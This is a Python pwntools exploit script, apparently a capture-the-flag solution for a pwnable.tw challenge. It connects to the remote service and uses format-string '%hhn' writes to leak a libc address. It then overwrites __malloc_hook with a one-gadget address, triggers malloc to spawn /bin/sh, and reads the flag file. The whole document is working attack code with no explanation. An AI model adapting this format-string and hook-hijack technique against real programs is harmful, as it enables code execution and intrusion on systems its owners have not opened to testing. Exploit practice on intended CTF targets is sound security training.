from pwn import *

#io = process('./chal')
io = remote('chall.pwnable.tw', 10307)
libc = ELF('./libc.so.6')

context.clear(arch = 'amd64')

writes = {0x601020:0x4540,
        0x3ff2e0:0x925}

a = b'%2341c%11$hhn%27c%12$hhn%5c%13$hhnaaaaba\xe0\xf2?\x00\x00\x00\x00\x00 \x10`\x00\x00\x00\x00\x00!\x10`\x00\x00\x00\x00\x00'

b = b'%32$p%23c%23$hhn'

io.sendafter(b'Input :', a)
sleep(3)
io.sendline(b)
sleep(3)
libc.address = int(io.recv(14), 16) - 0x39ff8
log.info('libc: '+hex(libc.address))
addr = libc.address + 0x4526a
byte = (addr >> 16) & 0xff
if (byte <= 0x25):
    print(hex(libc.address + 0x4526a))
    print('nope')
    exit(1)

writes = {libc.sym['__malloc_hook']:(libc.address+0x4526a)&0xff}
a = b'%37c%23$hhn%69c%16$hhnaa'+p64(libc.sym['__malloc_hook'])
io.sendline(a)
sleep(3)

a = b'%37c%23$hhn%45c%16$hhnaa'+p64(libc.sym['__malloc_hook']+1)
io.sendline(a)
sleep(3)

a = '%37c%23$hhn%{}c%16$hhn'.format(byte - 37).encode('utf-8')
a = a.ljust(24, b'a')
a += p64(libc.sym['__malloc_hook']+2)
io.sendline(a)
sleep(3)

io.sendline(b'/bin/sh ; %100000c')

io.sendline(b'cat /home/printable/printable_fl4g >&2')
print(io.recv())
